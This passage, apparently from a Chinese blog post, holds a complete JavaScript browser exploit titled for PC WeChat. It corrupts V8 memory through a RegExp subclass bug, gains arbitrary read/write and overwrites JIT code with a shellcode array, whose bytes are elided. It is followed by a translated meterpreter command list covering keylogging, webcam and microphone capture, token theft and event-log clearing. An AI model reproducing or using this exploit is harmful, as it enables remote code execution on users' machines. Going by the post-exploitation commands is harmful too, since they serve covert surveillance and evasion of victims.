class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>PC微信好东西<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">ENABLE_LOG = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript">IN_WORKER = <span class="literal">true</span>;</span></span><br><span class="line"><span class="actionscript"><span class="comment">// run calc and hang in a loop</span></span></span><br><span class="line"><span class="actionscript"><span class="comment">//buf字符串放在这</span></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> shellcode = [<span class="number">0xfc</span>,<span class="number">0xe8</span>······];</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">print</span><span class="params">(data)</span> </span>&#123;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> not_optimised_out = <span class="number">0</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> target_function = (<span class="function"><span class="keyword">function</span> <span class="params">(value)</span> </span>&#123;</span></span><br><span class="line">    if (value == 0xdecaf0) &#123;</span><br><span class="line">        not_optimised_out += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    not_optimised_out += 1;</span><br><span class="line">    not_optimised_out |= 0xff;</span><br><span class="line">    not_optimised_out *= 12;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span></span><br><span class="line">    target_function(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> g_array;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> tDerivedNCount = <span class="number">17</span> * <span class="number">87481</span> - <span class="number">8</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> tDerivedNDepth = <span class="number">19</span> * <span class="number">19</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">cb</span><span class="params">(flag)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (flag == <span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    g_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>);</span></span><br><span class="line">    g_array[0] = 0x1dbabe * 2;</span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> <span class="string">'c01db33f'</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">gc</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> <span class="built_in">String</span>();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">oobAccess</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> this_ = <span class="keyword">this</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.buffer = <span class="literal">null</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.buffer_view = <span class="literal">null</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.page_buffer = <span class="literal">null</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.page_view = <span class="literal">null</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.prevent_opt = [];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> kSlotOffset = <span class="number">0x1f</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> kBackingStoreOffset = <span class="number">0xf</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">super</span>(<span class="number">0x1000</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.slot = <span class="keyword">this</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.page_buffer = <span class="keyword">new</span> LeakArrayBuffer();</span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.page_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.page_buffer);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> <span class="built_in">RegExp</span>(&#123; <span class="attr">toString</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">'a'</span> &#125; &#125;);</span></span><br><span class="line"><span class="actionscript">    cb(<span class="literal">true</span>);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="class"><span class="keyword">class</span> <span class="title">DerivedBase</span> <span class="keyword">extends</span> <span class="title">RegExp</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// var array = null;</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">super</span>(</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// at this point, the 4-byte allocation for the JSRegExp `this` object</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// has just happened.</span></span></span><br><span class="line">                &#123;</span><br><span class="line">                    toString: cb</span><br><span class="line"><span class="actionscript">                &#125;, <span class="string">'g'</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// now the runtime JSRegExp constructor is called, corrupting the</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// JSArray.</span></span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="comment">// this allocation will now directly follow the FixedArray allocation</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// made for `this.data`, which is where `array.elements` points to.</span></span></span><br><span class="line"><span class="javascript">            this_.buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80</span>);</span></span><br><span class="line">            g_array[8] = this_.page_buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// try&#123;</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> derived_n = eval(`(<span class="function"><span class="keyword">function</span> <span class="title">derived_n</span><span class="params">(i)</span> </span>&#123;</span></span><br><span class="line">        if (i == 0) &#123;</span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> DerivedBase;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="class"><span class="keyword">class</span> <span class="title">DerivedN</span> <span class="keyword">extends</span> <span class="title">derived_n</span>(<span class="title">i</span>-1) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">super</span>();</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="actionscript">                $&#123;<span class="string">"this.a=0;"</span>.repeat(tDerivedNCount)&#125;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> DerivedN;</span></span><br><span class="line">    &#125;)`);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> (derived_n(tDerivedNDepth))();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.buffer_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.buffer);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.leakPtr = <span class="function"><span class="keyword">function</span> <span class="params">(obj)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.page_buffer.slot = obj;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>.buffer_view.getUint32(kSlotOffset, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.setPtr = <span class="function"><span class="keyword">function</span> <span class="params">(addr)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.buffer_view.setUint32(kBackingStoreOffset, addr, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.read32 = <span class="function"><span class="keyword">function</span> <span class="params">(addr)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.setPtr(addr);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>.page_view.getUint32(<span class="number">0</span>, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.write32 = <span class="function"><span class="keyword">function</span> <span class="params">(addr, value)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.setPtr(addr);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.page_view.setUint32(<span class="number">0</span>, value, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.write8 = <span class="function"><span class="keyword">function</span> <span class="params">(addr, value)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.setPtr(addr);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.page_view.setUint8(<span class="number">0</span>, value, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.setBytes = <span class="function"><span class="keyword">function</span> <span class="params">(addr, content)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; content.length; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.write8(addr + i, content[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> oob = oobAccess();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> func_ptr = oob.leakPtr(target_function);</span></span><br><span class="line"><span class="actionscript">    print(<span class="string">'[*] target_function at 0x'</span> + func_ptr.toString(<span class="number">16</span>));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> kCodeInsOffset = <span class="number">0x1b</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> code_addr = oob.read32(func_ptr + kCodeInsOffset);</span></span><br><span class="line"><span class="actionscript">    print(<span class="string">'[*] code_addr at 0x'</span> + code_addr.toString(<span class="number">16</span>));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    oob.setBytes(code_addr, shellcode);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    target_function(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="actionscript">    print(<span class="string">"start running"</span>);</span></span><br><span class="line">    trigger();</span><br><span class="line"><span class="actionscript">&#125;<span class="keyword">catch</span>(e)&#123;</span></span><br><span class="line">    print(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="meterpreter命令详解"><a href="#meterpreter命令详解" class="headerlink" title="meterpreter命令详解"></a>meterpreter命令详解</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">    Command              Description</span></span><br><span class="line"><span class="code">    -------                   -----------</span></span><br><span class="line"><span class="code">    ?                         帮助菜单</span></span><br><span class="line"><span class="code">    background                当前会议的背景</span></span><br><span class="line"><span class="code">    bg                        背景的别称</span></span><br><span class="line"><span class="code">    bgkill                    杀死一个后台计价器脚本</span></span><br><span class="line"><span class="code">    bglist                    列出正在运行的后台脚本</span></span><br><span class="line"><span class="code">    bgrun                     以后台线程的形式执行抄表器脚本</span></span><br><span class="line"><span class="code">    channel                   显示信息或控制活动通道</span></span><br><span class="line"><span class="code">    close                     关闭通道</span></span><br><span class="line"><span class="code">    disable_unicode_encoding  禁用unicode字符串的编码。</span></span><br><span class="line"><span class="code">    enable_unicode_encoding   启用unicode字符串的编码。</span></span><br><span class="line"><span class="code">    exit                      终止流量计会话</span></span><br><span class="line"><span class="code">    get_timeouts              获取当前会话超时值</span></span><br><span class="line"><span class="code">    guid                      获取会话GUID</span></span><br><span class="line"><span class="code">    help                      帮助菜单</span></span><br><span class="line"><span class="code">    info                      显示邮政模块的信息</span></span><br><span class="line"><span class="code">    irb                       在当前会话上打开一个交互式Ruby shell</span></span><br><span class="line"><span class="code">    load                      装入一个或多个表前仪分机</span></span><br><span class="line"><span class="code">    machine_id                获取连接到会话的机器的MSF ID。</span></span><br><span class="line"><span class="code">    migrate                   将服务器迁移到另一个进程</span></span><br><span class="line"><span class="code">    pivot                     管理中枢监听器</span></span><br><span class="line"><span class="code">    pry                       在当前会话上打开Pry调试器。</span></span><br><span class="line"><span class="code">    quit                      终止流量计会话</span></span><br><span class="line"><span class="code">    read                      从通道中读取数据</span></span><br><span class="line"><span class="code">    resource                  运行存储在文件中的命令</span></span><br><span class="line"><span class="code">    run                       执行一个抄表器脚本或Post模块。</span></span><br><span class="line"><span class="code">    secure                    (重)在会话上协商TLV数据包加密问题</span></span><br><span class="line"><span class="code">    sessions                  快速切换到另一个会话</span></span><br><span class="line"><span class="code">    set_timeouts              设置当前会话超时值</span></span><br><span class="line"><span class="code">    sleep                     迫使Meterpreter安静下来，然后重新建立会话。</span></span><br><span class="line"><span class="code">    transport                 改变当前的传输机制</span></span><br><span class="line"><span class="code">    use                       "load "的弃用别名</span></span><br><span class="line"><span class="code">    uuid                      获取当前会话的UUID</span></span><br><span class="line"><span class="code">    write                     将数据写入通道</span></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    cat           将文件内容读到屏幕上</span></span><br><span class="line"><span class="code">    cd            更改目录</span></span><br><span class="line"><span class="code">    checksum      检索文件的校验和</span></span><br><span class="line"><span class="code">    cp            将源头复制到目的地</span></span><br><span class="line"><span class="code">    dir           列表文件（ls的别名</span></span><br><span class="line"><span class="code">    download      下载文件或目录</span></span><br><span class="line"><span class="code">    edit          编辑文件</span></span><br><span class="line"><span class="code">    getlwd        打印本地工作目录</span></span><br><span class="line"><span class="code">    getwd         打印工作目录</span></span><br><span class="line"><span class="code">    lcd           更改本地工作目录</span></span><br><span class="line"><span class="code">    lls           列出本地文件</span></span><br><span class="line"><span class="code">    lpwd          打印本地工作目录</span></span><br><span class="line"><span class="code">    ls            列表文件</span></span><br><span class="line"><span class="code">    mkdir         制作目录</span></span><br><span class="line"><span class="code">    mv            将源头移动到目的地</span></span><br><span class="line"><span class="code">    pwd           打印工作目录</span></span><br><span class="line"><span class="code">    rm            删除指定的文件</span></span><br><span class="line"><span class="code">    rmdir         删除目录</span></span><br><span class="line"><span class="code">    search        搜索文件</span></span><br><span class="line"><span class="code">    show_mount    列出所有挂载点/逻辑驱动器</span></span><br><span class="line"><span class="code">    upload        上传文件或目录</span></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    arp           显示主机ARP缓存</span></span><br><span class="line"><span class="code">    getproxy      显示当前的代理配置</span></span><br><span class="line"><span class="code">    ifconfig      显示界面</span></span><br><span class="line"><span class="code">    ipconfig      显示界面</span></span><br><span class="line"><span class="code">    netstat       显示网络连接</span></span><br><span class="line"><span class="code">    portfwd       将本地端口转发给远程服务</span></span><br><span class="line"><span class="code">    resolve       在目标机上解析一组主机名。</span></span><br><span class="line"><span class="code">    route         查看和修改路由表</span></span><br><span class="line">Stdapi: System Commands</span><br><span class="line">=======================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    clearev       清除事件日志</span></span><br><span class="line"><span class="code">    drop_token    放弃任何活动的冒充令牌。</span></span><br><span class="line"><span class="code">    execute       执行一个命令</span></span><br><span class="line"><span class="code">    getenv        获取一个或多个环境变量值</span></span><br><span class="line"><span class="code">    getpid        获取当前进程标识符</span></span><br><span class="line"><span class="code">    getprivs      试图启用当前进程的所有可用特权</span></span><br><span class="line"><span class="code">    getsid        获取服务器正在运行的用户的SID为</span></span><br><span class="line"><span class="code">    getuid        获取服务器运行的用户为</span></span><br><span class="line"><span class="code">    kill          终止一个进程</span></span><br><span class="line"><span class="code">    localtime     显示目标系统的本地日期和时间。</span></span><br><span class="line"><span class="code">    pgrep         按名称过滤进程</span></span><br><span class="line"><span class="code">    pkill         按名称终止进程</span></span><br><span class="line"><span class="code">    ps            列出正在运行的进程</span></span><br><span class="line"><span class="code">    reboot        重新启动远程计算机</span></span><br><span class="line"><span class="code">    reg           修改远程注册表并与之互动</span></span><br><span class="line"><span class="code">    rev2self      在远程机器上调用RevertToSelf()。</span></span><br><span class="line"><span class="code">    shell         进入系统命令行</span></span><br><span class="line"><span class="code">    shutdown      关闭远程电脑</span></span><br><span class="line"><span class="code">    steal_token   试图从目标进程中窃取冒充令牌</span></span><br><span class="line"><span class="code">    suspend       暂停或恢复进程清单。</span></span><br><span class="line"><span class="code">    sysinfo       获取远程系统的信息，如操作系统。</span></span><br><span class="line">Stdapi: User interface Commands</span><br><span class="line">===============================</span><br><span class="line"><span class="code">    Command        Description</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    enumdesktops   列出所有可访问的桌面和窗口站</span></span><br><span class="line"><span class="code">    getdesktop     获取当前的仪表盘桌面</span></span><br><span class="line"><span class="code">    idletime       返回远程用户闲置的秒数。</span></span><br><span class="line"><span class="code">    keyboard_send  发送按键</span></span><br><span class="line"><span class="code">    keyevent       发送关键事件</span></span><br><span class="line"><span class="code">    keyscan_dump   转储按键缓冲区</span></span><br><span class="line"><span class="code">    keyscan_start  开始捕捉按键</span></span><br><span class="line"><span class="code">    keyscan_stop   停止捕捉按键</span></span><br><span class="line"><span class="code">    mouse          发送鼠标事件</span></span><br><span class="line"><span class="code">    screenshare    实时观看远程用户的桌面。</span></span><br><span class="line"><span class="code">    screenshot     抓取交互式桌面的截图</span></span><br><span class="line"><span class="code">    setdesktop     更改当前桌面的计价器</span></span><br><span class="line"><span class="code">    uictl          控制一些用户界面组件</span></span><br><span class="line">Stdapi: Webcam Commands</span><br><span class="line">=======================</span><br><span class="line"><span class="code">    Command        Description</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    record_mic     用默认麦克风录制音频X秒。</span></span><br><span class="line"><span class="code">    webcam_chat    开始视频聊天</span></span><br><span class="line"><span class="code">    webcam_list    网络摄像机列表</span></span><br><span class="line"><span class="code">    webcam_snap    从指定的网络摄像头拍摄快照</span></span><br><span class="line"><span class="code">    webcam_stream  播放指定网络摄像头的视频流</span></span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    play          在目标系统上播放音频文件，没有任何内容写入磁盘</span></span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    getsystem     试图将你的权限提升到本地系统的权限。</span></span><br><span class="line">Priv: Password database 